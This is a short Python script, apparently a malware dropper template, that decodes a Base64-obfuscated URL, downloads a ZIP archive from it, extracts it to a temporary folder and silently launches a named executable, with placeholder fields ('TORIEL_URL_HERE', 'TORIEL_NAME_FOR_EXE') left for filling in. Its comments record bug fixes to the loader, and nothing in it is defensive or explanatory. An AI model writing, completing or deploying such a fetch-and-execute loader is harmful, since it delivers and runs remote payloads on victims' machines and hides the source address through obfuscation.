import requests
import base64
import os
import zipfile
import io
import subprocess
import tempfile
from urllib.parse import unquote  # Missing import


def download_zip(url):  # Parameter name was wrong (used 'url' in call but 'url' in definition)
    try:
        # Add padding if needed for Base64
        padding = len(url) % 4
        if padding:
            url += "=" * (4 - padding)
            
        decoded_bytes = base64.b64decode(url)
        decoded_url = decoded_bytes.decode('utf-8')
        
        clean_url = unquote(decoded_url)
        
        if not clean_url.startswith(('http://', 'https://')):
            clean_url = 'http://' + clean_url
            
        print(f"[*] Downloading zip file...")  # Debug output
        r = requests.get(clean_url)
        r.raise_for_status()
        return r.content
        
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return None


def extract_and_run(zip_data, exename):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            print(f"[*] Extracting to {tmpdir}")
            # Wrap zip_data in BytesIO since we're working with bytes
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                z.extractall(tmpdir)

            exe_path = os.path.join(tmpdir, f"{exename}.exe")
            if os.path.exists(exe_path):
                print(f"[*] Running {exe_path}")
                # Safer execution without shell=True
                subprocess.Popen([exe_path], cwd=tmpdir)
            else:
                print("[!] EXE not found in ZIP! Contents:")
                print(os.listdir(tmpdir))  # Show extracted files for debugging
    except Exception as e:
        print(f"[!] Extraction failed: {e}")


def main():
    url = 'TORIEL_URL_HERE'  # Replace with the actual Base64 URL
    exename = 'TORIEL_NAME_FOR_EXE'
    
    zip_data = download_zip(url)
    if zip_data:
        extract_and_run(zip_data, exename)
    else:
        print("[!] No ZIP data received")


if __name__ == "__main__":
    main()